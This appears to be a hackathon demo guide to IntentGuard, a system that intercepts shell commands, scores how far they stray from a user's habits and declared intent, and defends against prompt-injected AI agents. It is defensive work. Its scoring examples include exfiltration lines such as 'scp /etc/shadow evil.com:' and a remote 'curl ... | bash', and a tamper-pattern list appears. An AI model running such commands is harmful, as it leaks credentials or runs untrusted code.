# IntentGuard — Jury Demo Guide (4 Sept 2026)
### Code-Grounded, End-to-End Explanation

---

## 1. How Does the Username Enter the System — and How Does It Connect to the Terminal Session?

### There Is No Registration Step

The very first thing to understand is that there is **no user onboarding form, no account creation, and no registration endpoint** in IntentGuard. A user's identity enters the system the moment their first shell command arrives. Every subsequent interaction builds on that automatically.

### Step 1 — The Shell Hook Resolves the Username

When a user presses Enter in their terminal, the shell hook (a small script sourced into the user's `.bashrc` or `.zshrc`) fires before the command executes. Inside `intentguard-common.sh` the very first thing it does is resolve who is typing:

```bash
__intentguard_user() {
    id -un 2>/dev/null || printf '%s' "${USER:-${LOGNAME:-unknown}}"
}
```

`id -un` is the standard POSIX call that returns the OS-level username — the same one the kernel assigns to the process. If `id` fails for any reason, it falls back to the shell's `$USER` environment variable, then `$LOGNAME`, and finally the literal string `"unknown"`. This is OS-derived identity; it cannot be spoofed by the user because the shell hook runs in the user's own OS process context.

### Step 2 — The Hook Builds a JSON Request

The function `__intentguard_build_request` in `intentguard-common.sh` takes the resolved username and the command text and assembles a single-line JSON object:

```json
{
  "actorType": "HUMAN",
  "userId": "ravi",
  "humanPrincipalId": null,
  "commandText": "ls -la /etc",
  "cwd": "/home/ravi",
  "envContext": { "SHELL": "/bin/zsh", "TERM": "xterm-256color", "LANG": "en_US.UTF-8" },
  "timestamp": 1725440800000,
  "inputOrigin": "TYPED"
}
```

The `actorType` field defaults to `HUMAN` from the environment variable `INTENTGUARD_ACTOR_TYPE`. If an AI agent harness is running the commands, it must set `INTENTGUARD_ACTOR_TYPE=AGENT` and provide `INTENTGUARD_HUMAN_PRINCIPAL=<supervisor-id>` — these are the only two variables that distinguish a human from an agent at the wire level. The script uses `jq` for JSON serialization (with a pure-shell fallback escaper for environments without `jq`).

### Step 3 — Typed vs. Pasted Detection

This is a detail that matters for security. In the Zsh hook (`intentguard-zsh.sh`), the script wraps the ZLE `bracketed-paste` widget. When the terminal sends a bracketed-paste escape sequence (which all modern terminals do when you Ctrl+V), the hook sets a flag `__intentguard_zsh_pasted=1` before any scoring happens. This flag becomes `"inputOrigin": "PASTED"` in the JSON. In Bash, reliable paste detection is not possible without breaking readline, so the origin defaults to `"UNKNOWN"`.

### Step 4 — The Unix Domain Socket

The JSON is sent over a Unix domain socket at `/var/run/intentguard/intentguard.sock`. The script uses `socat` as the primary transport client, with `nc -U` as a fallback. The shell **blocks at this point** — it cannot execute the command until it gets a verdict back from the engine.

### Step 5 — Server-Side Decoding and Domain Conversion

On the Java side, `UnixDomainSocketServer` accepts the connection. `ShellSignalCodec.decodeRequest(json)` deserializes the JSON into a `ShellHookRequest` record:

```java
public record ShellHookRequest(
        ActorType actorType,
        String userId,
        String humanPrincipalId,
        String commandText,
        String cwd,
        Map<String, String> envContext,
        Long timestamp,
        InputOrigin inputOrigin,
        Boolean opensOutboundConnection,
        Boolean accessesSecret,
        Boolean privilegeEscalation)
```

Its `toDomain()` method builds the `Actor(ActorType.HUMAN, "ravi", null)` object and wraps it in a `RawShellSignal`.

### Step 6 — Profile Auto-Creation on First Event

`BehavioralProfileManager.recordAllowedEvent()` calls `repository.findByUserId(userId).orElseGet(() -> newProfile(userId))`. The `newProfile()` method creates a `BehavioralProfileDocument` with `eventCount=0` and `state="LEARNING"`. This profile is persisted to the `behavioral_profiles` MongoDB collection automatically. No prior step is needed. The user starts being learned from the first allowed command.

### What Is Required for the App to Connect With the System Terminal

Three things must be in place:

1. **Shell hook sourced** — `source /opt/intentguard/intentguard-zsh.sh` (or bash equivalent) added to the user's `.zshrc`/`.bashrc`.
2. **Socket present** — the IntentGuard Spring Boot application must be running so that `UnixDomainSocketServer` has bound to `/var/run/intentguard/intentguard.sock`.
3. **Tools available** — `socat` or `nc` must be on the `PATH` for the socket transport.

That is the complete onboarding. No agent, no dashboard signup, no configuration file per user.

---

## 2. System Architecture — How It All Works Once a User Is Onboarded

Once the user is connected, every command they type flows through a six-stage pipeline. Here is the sequence in words:

**Stage 1 — Ingestion.** The Unix domain socket server (`UnixDomainSocketServer`) accepts the connection on a cached thread pool. `InteractiveSignalIngestor.submitInteractive(signal)` wraps the entire downstream work in a `Future` submitted to another thread pool, then calls `Future.get(2000, MILLISECONDS)`. The shell is blocked for at most 2 seconds. If the engine does not respond in time, the command is blocked as a fail-safe.

**Stage 2 — Scoring.** `DefaultScoringPipeline.score(ScoringContext)` runs four independent divergence components against the command. Each component returns a `ComponentResult` with a score in [0,1] and its weight. The pipeline combines them using a renormalized weighted sum into a single Composite Divergence Score, then applies the `AgentRiskAdjuster`.

**Stage 3 — Guardrail Evaluation.** Before the decision engine runs, the `GuardrailContext` is assembled: the `CommandPolicyService` evaluates pattern-based policy rules against the command; `BlastRadiusGuard` checks for protected targets, mass operations, and destructive verbs; the exfiltration, velocity, and time-context stretch guardrails (when enabled) each contribute a floor.

**Stage 4 — Decision.** `GuardrailDecisionEngine.decide(...)` runs through its ordered 7-step chain to produce a `Decision(CorrectiveAction, score, reasonCode)`. The corrective action is one of ALLOW, ASK, or BLOCK.

**Stage 5 — Verdict Encoding.** The `Decision` is encoded as a `Verdict` JSON object. `UnixDomainSocketServer` writes it back to the socket. The shell hook reads the response and applies it: ALLOW → run the command; ASK → prompt the operator with a 15-second confirmation timeout; BLOCK → print the reason and refuse.

**Stage 6 — Learning.** `BehavioralProfileManager.recordEvent(event, action, minEvents)` is called only when `action == ALLOW`. This updates the MongoDB profile: command vocabulary (executable counts), bigram sequence statistics (`"prev>curr"` → count), typed-vs-pasted ratios per category, and timing patterns (hour histogram). Blocked and ASK-rejected events **never** influence the learned baseline.

In parallel, if the audit feed is configured, `AuditFeedReader` is tailing the auditd log asynchronously. The `Correlator` matches audit events to hook events for the same user within a 1-second window. Unmatched audit events (commands that ran without passing through the hook) are flagged as hook bypasses.

---

## 3. Shell Hook and Signal Ingestion — Theory

### The Problem It Solves

A normal shell executes everything you type. There is no native interposition layer between the user's keystroke and the `execve()` system call. The shell hook is the solution: it installs a callback that fires *before* the shell executes the command and has the ability to *veto* execution by returning a non-zero exit code.

### Bash Hook Mechanism

The Bash hook (`intentguard-bash.sh`) uses two features:
- `shopt -s extdebug` — enables extended debug mode, where a non-zero return from a DEBUG trap causes bash to skip the current command entirely.
- `trap '__intentguard_bash_debug' DEBUG` — registers the function as the pre-exec callback.

Because the DEBUG trap fires on each simple command token rather than the entire compound command line, the hook uses `history 1` to recover the full raw line the user typed (including pipes, semicolons, and redirects). It also guards against recursion by checking `__intentguard_at_prompt=1` (set by `PROMPT_COMMAND`) to distinguish user-entered lines from commands the trap itself runs internally.

### Zsh Hook Mechanism

Zsh's ZLE (Z-shell Line Editor) provides a cleaner path. The `accept-line` widget fires when the user presses Enter, before any parsing. The hook wraps this widget:

```bash
intentguard-accept-line() {
    __intentguard_check "${BUFFER}" "TYPED"
    local rc=$?
    if [[ ${rc} -ne 0 ]]; then
        BUFFER=""
        zle .reset-prompt
        return 0
    fi
    zle .accept-line
}
zle -N accept-line intentguard-accept-line
```

The entire buffer (the full command line) is available as `$BUFFER`. If `__intentguard_check` returns non-zero, the buffer is cleared and the prompt is reset without ever calling `.accept-line`. The command never enters the shell's execution path.

Pasted text is detected by wrapping the `bracketed-paste` ZLE widget and setting `__intentguard_zsh_pasted=1` before the paste is inserted into the buffer.

### The Core Gate: `__intentguard_check`

This function in `intentguard-common.sh` orchestrates the entire blocking path:
1. Calls `__intentguard_build_request` to build the JSON.
2. Calls `__intentguard_send` to write it to the socket and block for the response.
3. If no response arrives → `__intentguard_failsafe` (by default: block).
4. Parses the `action` and `explanation` fields from the verdict JSON.
5. On ALLOW → `return 0` (let the command run).
6. On ASK → `__intentguard_confirm` (prompt operator; `read` with a 15-second timeout; `y`/`Y`/`yes` returns 0, anything else returns 1).
7. On BLOCK → log the explanation and `return 1` (veto execution).

### The 2-Second Budget

`InteractiveSignalIngestor` enforces the budget on the Java side. It submits the decision work to a thread pool and waits with `Future.get(budgetMillis, MILLISECONDS)` where `budgetMillis` defaults to 2000. On timeout it calls `future.cancel(true)` to interrupt the worker, then returns `Verdict.block("DECISION_BUDGET_EXCEEDED", ...)`. The shell's socket client has its own `socat -t3` deadline as an outer fallback. Two independent layers guard the 2-second SLA.

### Fail-Safe Design

At every failure point the system defaults to the most restrictive available action. If the socket file doesn't exist → block. If the transport fails → block. If the verdict JSON is garbled → block (encoded by `UnixDomainSocketServer`'s exception handler). If the Java engine times out → block. An `INTENTGUARD_FAIL_MODE=ask` environment variable can soften the fail-safe to a prompt, but the default is always block.

---

## 4. The Audit Feed — Asynchronous Detection

### Why It Exists

The shell hook only covers commands entered interactively via the terminal. A sophisticated attacker might bypass it: swap the shell binary, use `exec` from a different process, or exploit a PTY vulnerability. The audit feed provides a **second, independent detection layer** using the Linux kernel's own auditd subsystem, which logs every `execve()` system call. Auditd cannot be bypassed from userspace without root.

### How It Works

`AuditFeedReader` starts a daemon thread (`intentguard-audit-tail`) when the `intentguard.audit.log-path` property is configured. The thread reads the configured log file line-by-line in a tail-follow loop (reading, sleeping 100ms at EOF, reading again). It calls `AuditLineParser.parse(line)` on each line to extract the command and user identity from the auditd format, then `AuditSignalNormalizer.normalize(rawAuditSignal)` to build a `CommandEvent` with `signalSource=AUDIT`, `inputOrigin=UNKNOWN`, and `AgentRiskMarkers.none()`.

Audit events are delivered synchronously to a configurable `Consumer<CommandEvent>` sink. Unparseable lines are silently skipped. If the file becomes unreadable, the thread logs a warning and terminates gracefully without crashing the application.

### Correlation

The `Correlator` component correlates hook events with audit events. Its predicate is: two events are correlated if they share the same `userId` **and** `|t_hook - t_audit| <= windowMs` (default 1000ms). The `correlate(hookEvents, auditEvents, windowMs)` method batch-matches each audit event to the closest still-unmatched hook event for the same user within the window.

- **Matched** → the audit event corroborates the hook event (normal path; the command was seen by both layers).
- **Unmatched audit event** → a command ran via `execve()` but never passed through the blocking hook. This is a **hook bypass** detection event — it is flagged and pushed to the Control Tower as an alert.

### What Audit Cannot Do

Auditd events arrive *after* the command has already executed. The audit feed is a detection-only channel; it cannot block anything. Its role is to catch bypasses, not to be the primary gate. This asymmetry is intentional.

---

## 5. The Scoring Pipeline — In-Depth Risk Evaluation

### Philosophy

Every command produces a single number: the **Composite Divergence Score** in [0.0, 1.0]. Zero means perfectly expected. One means maximally suspicious. The score feeds the decision engine's threshold map. The pipeline is **deterministic** — same inputs plus same config always produce the same score, with no randomness and no wall-clock time dependency.

### The Four Components

`DefaultScoringPipeline.score(ScoringContext)` iterates its four registered `DivergenceComponent` beans in alphabetical order by `ComponentId` name (for determinism) and collects a `ComponentResult` from each.

---

#### Component 1: Sequence Surprise (SEQUENCE_SURPRISE)

**What it measures:** how statistically unexpected this command is given the user's own history of commands.

**The math:** The command text is reduced to a `normalizedToken` (executable + coarse argument shape, e.g., `git commit`) and an `executable` (`git`). The component looks in the user's `ProfileSnapshot`:

- If the profile knows the previous command token (`lastCommandToken`) **and** has outgoing bigram transitions from it, it uses a **bigram model**: `P(currToken | prevToken)` estimated from `sequenceStats` where keys are `"prev>curr"` strings.
- Otherwise it falls back to a **unigram model**: `P(executable)` estimated from `vocabulary` counts.

In both cases, add-one (Laplace) smoothing prevents zero probabilities:
```
p        = (C + 1) / (D + V + 1)
pFloor   = 1 / (D + V + 1)
surprise = -ln(p) / -ln(pFloor)
```
Where `C` is the observed count, `D` is the total count of the distribution, and `V` is the vocabulary size. When `C = 0` (never seen before), `p = pFloor`, so `surprise = 1.0` exactly. As the count grows, surprise approaches 0. The code clamps NaN values to 1.0 to guard against degenerate distributions.

**Threat caught:** A compromised AI running `curl | bash` after a history of `git` commands scores very high here.

---

#### Component 2: Context Mismatch (CONTEXT_MISMATCH)

**What it measures:** whether the type of command is consistent with where the user is working.

**The mechanism:** `CommandNormalizer.category()` classifies the command into a category (e.g., `network`, `file-ops`, `package-management`). The component derives a deterministic set of context tags from the `cwd`: `"repoDir"` if the working directory is inside a repository, `"home"` if under `/home`/`/Users`/`~`, `"tmp"` if under `/tmp`, `"system"` if under `/etc`/`/usr`/`/sbin`/`/bin`, and `"other"` otherwise.

The user's `contextAssociations` in the profile map each category to the contexts it was previously observed in. Scoring:
- **0.0** → this command category has previously been used in a context tag matching the current one (consistent).
- **1.0** → the category is known to the profile but has never appeared in any of the current context tags (mismatch).
- **0.5** → the category has never been seen in a non-empty profile (novel category, moderate suspicion).
- **0.0** → the profile is empty and has no associations to compare against (no basis for mismatch).

**Threat caught:** An operator declares they are working on nginx config, but the first command is `mysql --execute DROP DATABASE`. High category mismatch.

---

#### Component 3: Semantic Inconsistency (SEMANTIC_INCONSISTENCY)

**What it measures:** does this command actually align with what the operator said they were going to do?

**The mechanism:** This component first checks `ctx.hasIntent()`. An intent exists when both `intentText != null` **and** `intentSource != NONE`. If there is no intent session, the component returns `ComponentResult.excluded(id, weight, "no_intent")` — it is simply removed from the scoring and the remaining components' weights renormalize. No LLM call is made.

When an intent exists, it calls `llmService.semanticInconsistency(event, intentText)` which invokes Gemini (the LLM) with a structured prompt asking it to score how inconsistent the command is with the stated intent, returning a double in [0,1]. The call is bounded at **1200 milliseconds**. If Gemini times out or returns something malformed → `OptionalDouble.empty()` → the component is excluded with reason `"llm_unavailable"` and the remaining three components carry the full scoring weight. If the intent source was `INFERRED` (rather than explicitly declared), the component uses `inferredIntentSemanticWeight` instead of the standard weight, giving it less influence.

**Threat caught:** Operator says "I am deploying the web service." Command: `scp /etc/passwd evil.com:`. Gemini scores this at 0.95. The Semantic Inconsistency component returns a near-maximum score.

---

#### Component 4: Behavioral Deviation (BEHAVIORAL_DEVIATION)

**What it measures:** how far is this specific command event from the user's learned behavioral fingerprint?

**Four internal features**, each producing a value in [0,1], combined with fixed weights summing to 1.0:

- **Vocabulary (W=0.30):** Is the executable in the user's learned vocabulary? `vocabulary.get(executable) > 0` → `0.0`. Never seen → `1.0`. A binary feature.

- **Sequencing (W=0.25):** Does the normalized token appear as a known successor in `sequenceStats`? The check: any key in `sequenceStats` ending in `">token"` with a count > 0 → `0.0`. Not found → `1.0`.

- **Typed-vs-Pasted (W=0.35):** The highest-weighted feature. A TYPED origin → `0.0`. UNKNOWN → `0.20`. PASTED → `PASTED_BASE(0.40) + (1 - category_ratio) * PASTED_RATIO_SPAN(0.60)`. The `category_ratio` is the category's learned typed-vs-pasted ratio from the profile. A category that is historically always typed (ratio = 1.0) → pasted value = `0.40`. A category that has only ever been seen pasted (ratio = 0.0) → pasted value = `1.0`. This means a pasted command in a normally-typed category is scored much higher than a pasted command in a category where pasting is normal. This directly targets the copy-paste attack vector.

- **Timing (W=0.10):** Currently a neutral placeholder (always 0.0). The seam exists for future inter-command timing features.

The component deviation = `0.30*fVocab + 0.25*fSeq + 0.35*fPaste + 0.10*0.0`, clamped to [0,1].

**Threat caught:** `curl https://malicious.site/payload | bash` pasted into the terminal after a session of git commands. Vocabulary 1.0 + Sequencing 1.0 + Pasted 0.40+ = very high deviation.

---

### Agent Risk Adjustment

After `combine()` produces the composite, `AgentRiskAdjuster.adjust(composite, event)` is applied. This only fires for `AGENT` actor type. It counts the number of distinct risk markers on the `AgentRiskMarkers` object: `opensOutboundConnection`, `accessesSecret`, `privilegeEscalation`. Each marker adds `UPLIFT_PER_MARKER = 0.25` to a factor, capped at 1.0:

```
factor   = min(1.0, markerCount × 0.25)
adjusted = base + (1 - base) × factor
```

One marker: the score moves 25% of the remaining distance to 1.0. Two markers: 50%. Three markers: 75%. The score **never decreases**. This is a monotonic, deterministic uplift.

---

### Renormalized Weighted Sum

`DefaultScoringPipeline.combine(results)` computes:
```
composite = Σ(score_i × weight_i) / Σ(weight_i)
```
where the sum is over **non-excluded** components only. This is renormalization: if Semantic Inconsistency is excluded (no intent session), the remaining three components now each carry 33.3% of the total weight instead of 25%. The result is clamped to [0,1] against floating-point overshoot.

If all four components are excluded, composite = `0.0` by definition — the fail-safe is lenient at the scoring level but the decision engine's agent containment and learning clamp still apply afterward.

---

## 6. How We Stop AI Agents From Being Hacked — In Depth

The threat model has a specific name: **AI-agent hijack** — an attacker injects a malicious instruction into a prompt, and the AI agent executes a shell command the human operator never intended. IntentGuard defends against this with six independent layers.

### Layer 1: Wire-Level Actor Distinction

The very first defense is at the JSON request level. The `ShellHookRequest` has an `actorType` field: `HUMAN` or `AGENT`. An agent must be configured with `INTENTGUARD_ACTOR_TYPE=AGENT` in its harness environment. When absent (i.e., if an attacker sends a request without declaring actor type), the server defaults to `HUMAN` — which still goes through the full scoring pipeline.

Additionally, the `ShellHookRequest` carries three boolean risk markers that the agent harness is expected to set honestly:
- `opensOutboundConnection` — the command will make a network request
- `accessesSecret` — the command reads a credential or key file
- `privilegeEscalation` — the command uses sudo or similar

If an agent is hijacked via prompt injection and tries to exfiltrate data, the harness (if properly configured) will set `opensOutboundConnection=true` and `accessesSecret=true`.

### Layer 2: Agent Risk Score Uplift

`AgentRiskAdjuster` applies a deterministic uplift to the composite score for every `AGENT` event that carries risk markers. Two markers → factor = 0.50 → the score moves halfway to 1.0. This guarantees that a risky agent action starts the decision chain with a significantly elevated score, making it far more likely to hit the ASK or BLOCK thresholds even if the behavioral components alone did not reach them.

### Layer 3: Agent Containment (DefaultDecisionEngine)

Rule 4 in `DefaultDecisionEngine.decide()`:
```java
if (event.actorType() == ActorType.AGENT
        && !humanSessionOpen
        && action == CorrectiveAction.ALLOW) {
    action = CorrectiveAction.ASK;
    reasonCode = REASON_AGENT_CONTAINMENT;
}
```
An agent event that scored low enough to be ALLOW (score < 0.4) gets **upgraded to ASK** if no human intent session is currently open. An unattended agent — one running autonomously without a human declaring what the session is for — can never silently execute a command. It will always at minimum trigger a confirmation prompt.

### Layer 4: Intent Session Mutation Rejection (IntentSessionManager)

This is one of the most important security invariants in the entire system. The `IntentSessionManager` interface's contract requires every implementation to call `actor.isAgent()` and throw `AgentIntentMutationException` if it is true — on every `open()`, `close()`, and `modify()` call. This means:

- An agent **cannot open an intent session** claiming "I am deploying the web service" to lower the Semantic Inconsistency scores of its own commands.
- An agent **cannot close a human's intent session** to prevent scoring against a declared intent.
- An agent **cannot modify** the declared intent to match whatever command it is about to run.

The rejected attempt is also recorded in the Audit History — so if a hijacked agent tries this, there is a forensic trail.

### Layer 5: Capability Scope Floor (GuardrailDecisionEngine)

`GuardrailDecisionEngine` checks `!guardrail.withinCapabilityScope()`. When an agent attempts an action outside the scope it was authorized for, the corrective action floor is raised to `ASK` with reason `"CAPABILITY_SCOPE"`. The agent cannot act on resources it was not specifically granted capability over.

### Layer 6: Dual-Control for Sensitive Operations

`GuardrailContext.dualControl()` can be `PENDING` or `TIMED_OUT`. When a sensitive agent action requires a second human to approve (four-eyes principle), the engine raises the floor to `ASK` while `PENDING`. If the confirmation timer expires, it resolves to `BLOCK`. Critically, self-approval is rejected — the approver must be a different person from the originator.

### Why This Works as a System

None of these six layers depend on each other. A compromised agent that somehow bypasses the risk markers at Layer 1 still faces the behavioral deviation scoring at Layer 2. If it scores low, it still hits the containment check at Layer 3. Even if a human session happens to be open, the semantic inconsistency component (Layer 2/scoring) will flag commands that contradict the stated intent. Even if all of that fails, the dual-control layer (Layer 6) holds for sensitive operations. Each layer fails independently; an attacker must defeat all of them simultaneously.

---

## 7. The Decision Chain — In Depth

### Architecture

Two beans cooperate: `GuardrailDecisionEngine` (the `@Primary` Spring bean, the one callers use) and `DefaultDecisionEngine` (the inner threshold engine, injected into `GuardrailDecisionEngine`). The guardrail engine handles everything that can short-circuit or floor the decision before and after the threshold map. The default engine handles the threshold map itself, the learning clamp, and agent containment.

### Step-by-Step Decision Chain

**Step 1 — Tamper Override** (`GuardrailDecisionEngine` → `TamperClassifier`)

Before anything else, `tamperClassifier.isTamperAttempt(event)` scans the command text and cwd (case-insensitive) for a list of fragments: `"intentguard"`, `"/etc/intentguard"`, `"/var/lib/intentguard"`, `"intentguard.sock"`, `"threshold_config"`, `"behavioral_profiles"`, `"intent_sessions"`, `"audit_history"`, `"scenario_baselines"`. Any match → immediate `Decision(BLOCK, 1.0, "REJECTED_TAMPER")`. This decision cannot be softened by any subsequent step. It does not even look at the computed divergence score — the score is forced to 1.0. A command like `kill -9 $(pgrep intentguard)` is blocked here before the scoring result is even consulted.

**Step 2 — Policy DENY** (`GuardrailDecisionEngine` → `CommandPolicyService`)

`guardrail.policy().isDeny()` → `Decision(BLOCK, score, "POLICY_DENY")`. This uses the composite score from the pipeline (not forced to 1.0 like tamper), but the block is still unconditional. Critically, **this step runs before the learning clamp** (Step 5), which means a DENY policy rule can never be downgraded to ASK by the learning state. An admin can lock out specific command patterns permanently regardless of profile state.

**Step 3a — Blast Radius Block-on-Access** (`GuardrailDecisionEngine` → `BlastRadiusGuard`)

`guardrail.blastRadius().blockOnAccessHit()` → `Decision(BLOCK, score, "BLAST_RADIUS_BLOCK_ON_ACCESS")`. Protected targets like `/etc/shadow`, `/root/.ssh/id_rsa`, or `/var/run/intentguard/` are configured as `ProtectedTarget` entries with `blockOnAccess=true`. When the command text or cwd matches the glob pattern of a protected target, execution is blocked immediately. There is no threshold to beat and no learning state to check.

**Step 3b — Destructive Verb Score Floor** (`GuardrailDecisionEngine` → `BlastRadiusGuard`)

`guardrail.blastRadius().scoreFloor()` → if present, the composite score is raised to at least `destructiveOperationFloor` before it enters the threshold map. This means a `rm -rf /data` that scored 0.3 from the pipeline could have its effective score raised to 0.6 (into the ASK range) by the blast radius guard's score floor. The component breakdown in `DivergenceResult` is left intact; only the composite is raised.

**Step 4 — Threshold Map** (`DefaultDecisionEngine.mapThreshold()`)

This is where the computed (and possibly floor-raised) score maps to an initial action:
- `score < cfg.askThreshold()` (default 0.4) → **ALLOW** (`"THRESHOLD_ALLOW"`)
- `cfg.askThreshold() <= score < cfg.blockThreshold()` (default 0.8) → **ASK** (`"THRESHOLD_ASK"`)
- `score >= cfg.blockThreshold()` (default 0.8) → **BLOCK** (`"THRESHOLD_BLOCK"`)

The thresholds are hot-reloadable via `PUT /api/thresholds`. The mapping is monotonic — a higher score never yields a less restrictive action.

**Step 5 — Learning Clamp** (`DefaultDecisionEngine.decide()`)

```java
if (profileState == ProfileState.LEARNING && action == CorrectiveAction.BLOCK) {
    action = CorrectiveAction.ASK;
    reasonCode = REASON_LEARNING_CLAMP;
}
```
A user who has fewer than the configured minimum events (default 200) is in `ProfileState.LEARNING`. During this phase, a BLOCK from the threshold map is downgraded to ASK. This prevents false positives while the profile is still being built. ASK and ALLOW are unaffected. **Note that DENY policy rules (Step 2) run before this clamp**, so a hard-coded DENY is never subject to this downgrade.

**Step 6 — Agent Containment** (`DefaultDecisionEngine.decide()`)

An AGENT event that scored below the ask threshold (would ALLOW) is upgraded to ASK if no human intent session is open. ALLOW → ASK with reason `"AGENT_CONTAINMENT"`. This only upgrades ALLOW; it does not change ASK or BLOCK.

**Step 7 — Floor Model (GuardrailDecisionEngine)**

The final stage is a `Contribution` record that carries `(action, reason)` and implements a `raiseTo(floor, floorReason)` method that only changes the action and reason when the floor is strictly more restrictive. The earlier contributor wins on a tie. Four potential floors are applied in sequence:

- `REQUIRE_CONFIRM` policy rule → ASK floor (`"POLICY_REQUIRE_CONFIRM"`)
- Blast radius general floor → ASK floor (`"BLAST_RADIUS_ASK"`) — for mass operations, recursive flags, wildcards, indeterminate commands
- Capability scope violation → ASK floor (`"CAPABILITY_SCOPE"`)
- Dual-control PENDING → ASK floor (`"DUAL_CONTROL_PENDING"`)
- Dual-control TIMED_OUT → BLOCK (`"DUAL_CONTROL_TIMEOUT"`)

There is also a `POLICY_ALLOW` suppression: if a `POLICY_ALLOW` rule matched and the base decision from the threshold map was BLOCK, the action is suppressed to ALLOW with reason `"POLICY_ALLOW"`. This only applies to score-derived blocks; tamper/DENY/block-on-access are already returned before this point.

### Ask Timeout

`DefaultDecisionEngine.onAskTimeout(pending)` handles the case where the operator did not respond to the confirmation prompt in time. Any pending `ASK` decision becomes `Decision(BLOCK, score, "ASK_TIMEOUT_BLOCK")`. A non-answer is treated as a no.

---

## 8. Intent Sessions — In Depth

### What an Intent Session Is

Before starting a potentially sensitive or long-running task, the operator types a natural-language description of what they plan to do: "I am going to restart the payment service nginx on prod-01." This text is stored as the `declaredIntent` of an `IntentSession`. From that point forward, every command is scored by the `SemanticInconsistencyComponent` against this statement. Commands that match it score near 0; commands that have nothing to do with it score near 1.

### The IntentSession Record

```java
// IntentSession fields:
String sessionId         // UUID
String userId            // OS username
String declaredIntent    // Always English (engine-language text)
String originalDeclaredIntent   // Original non-English text (nullable)
String declaredIntentLanguageTag  // BCP-47 tag, defaults to "en"
IntentSource intentSource       // DECLARED or INFERRED
long startedAt           // epoch ms when opened
Long endedAt             // epoch ms when closed (null while open)
boolean open             // true while active
```

The most important field is `declaredIntent` — this is what the Gemini LLM actually scores commands against. It is always in English, regardless of what language the operator used to type it. If the operator typed in Hindi, the translation pipeline converts it to English before storing it here. `originalDeclaredIntent` preserves the raw source text for the audit log (Req 10.4).

### Session Lifecycle

**Opening a session (human only):**
`POST /api/sessions` with body `{ "intent": "...", "language": "hi", "operatorId": "ravi" }`. The `IntentSessionController` calls `InboundIntentService.submit(...)`.

If the language is English (or the `language` field is absent/`"en"`), `InboundIntentService` calls the 3-argument `IntentSessionManager.open(userId, declaredIntent, Actor.human(userId))` directly.

If the language is non-English, it first calls `translationService.translateInbound(intentText, sourceLanguage)`. On a `TRANSLATED` or `CACHED` result, it calls the 5-argument `open()` recording both the English translation and the original Hindi text. On any failure (provider timeout, unsupported language, token integrity violation), it returns `InboundIntentResult.rejected(localizedMessage)` and **no session is opened**. The HTTP response is 422 with the localized rejection message.

**Agent mutation rejection:**
`IntentSessionManager` has a contract-level invariant: any call with an `Actor` where `actor.isAgent()` is true throws `AgentIntentMutationException`. In the `DefaultIntentSessionManager` implementation, this is the very first line in `open()`, `close()`, and `modify()`. The session is left unchanged, and the attempt is recorded to the audit history.

**Scoring against the session:**
`SemanticInconsistencyComponent.score(ctx)` checks `ctx.hasIntent()`. The `ScoringContext` is built by the ingestor with `intentText = sessionManager.activeSessionFor(userId).map(s -> s.declaredIntent()).orElse(null)` and `intentSource = DECLARED` or `NONE`. When `hasIntent()` returns true, the LLM is called with the command text and the declared intent text.

**Closing a session:**
`GET /api/sessions?userId=ravi` to check the current session, then `DELETE` or the controller's close endpoint. `IntentSessionManager.close(sessionId, Actor.human(userId))` sets `endedAt = now` and `open = false` and persists to MongoDB. `IntentDriftTracker.reset(sessionId)` is called to clear the cumulative drift for the session. An agent attempting to call `close()` gets the mutation exception.

### How It Knows About Inferred Intents

When no human has explicitly opened a session but the system has enough behavioral context to infer one, `intentSource = INFERRED`. In this case `SemanticInconsistencyComponent` uses the `inferredIntentSemanticWeight` config value instead of the standard component weight — giving inferred intent less influence than a declared one. The `intentText` for an inferred intent comes from the profile's most common command context for that session, not from any LLM call.

### Brief Code Walkthrough

1. `POST /api/sessions` arrives at `IntentSessionController.openSession()`.
2. `operatorId` is extracted from the request body; defaults to `"admin"` if blank.
3. `Actor actor = Actor.human(operatorId)` — creates a human actor; will throw immediately if this were an agent.
4. `inboundIntentService.submit(operatorId, intentText, sourceLanguageTag, actor)` is called.
5. Inside `InboundIntentService`:
   a. If `sourceLanguageTag` is `"en"` or null → `sessionManager.open(user, intentText, actor)` → `IntentSession` stored in MongoDB `intent_sessions` collection → return `InboundIntentResult.opened(session)`.
   b. If non-English → `translationService.translateInbound(intentText, sourceLanguage)` → on TRANSLATED: `sessionManager.open(user, englishText, originalText, languageTag, actor)` → persisted.
   c. On translation failure → `InboundIntentResult.rejected(localized_message)` → controller returns HTTP 422.
6. Controller returns HTTP 201 `SessionView { sessionId, userId, declaredIntent, startedAt }`.

Later, when `ravi` types a command:
7. `ScoringContext` is built with `intentText = "restart payment nginx on prod-01"` (the English text stored in MongoDB).
8. `SemanticInconsistencyComponent.score(ctx)` calls `gemini.semanticInconsistency(cmd, intentText)`.
9. Gemini returns 0.05 for `sudo systemctl restart nginx` (matches) and 0.97 for `scp /etc/shadow evil.com:` (violates).

---

## 9. Translation — How the Language Pipeline Works

### Problem and Design Goal

Operators who prefer Hindi, Tamil, Bengali, or 8 other Indian languages should be able to declare their intent in their native language. The engine must work entirely in English internally. The translation layer bridges this gap — with one absolute requirement: **technical tokens (commands, paths, IPs, hostnames) must survive translation byte-for-byte**. A translation provider that garbles `nginx` into something else, or mangles `/var/log/syslog`, would break the entire scoring and policy matching system.

### The 11-Step Pipeline (DefaultTranslationService.translate)

**Step 1 — English passthrough:** If the target language is already English, return the original text as `ENGLISH_PASSTHROUGH` immediately. No provider call, no network request.

**Step 2 — Unsupported language check:** If either the source or target language is not in the `SupportedLanguages` set (which covers the 11 supported BCP-47 tags: `en`, `hi`, `bn`, `te`, `mr`, `ta`, `gu`, `kn`, `ml`, `pa`, `or`), return `UNSUPPORTED_LANGUAGE`.

**Step 3 — Runtime capability gate:** If `!runtimeConfig.isTextTranslationEnabled()` (no API key was found at startup), return `ENGLISH_PASSTHROUGH`. The engine still functions, just without translation.

**Step 4 — Sensitive content gate:** If the content is flagged as sensitive and `!config.sensitiveContentTranslatable()`, return `ENGLISH_PASSTHROUGH`. Sensitive command text never leaves for a translation provider.

**Step 5 — Cache lookup:** `TranslationCache.lookup(sourceText, targetLanguageTag)` checks a `ConcurrentHashMap<(text, lang), translatedText>`. On a hit, return `CACHED`. No network request.

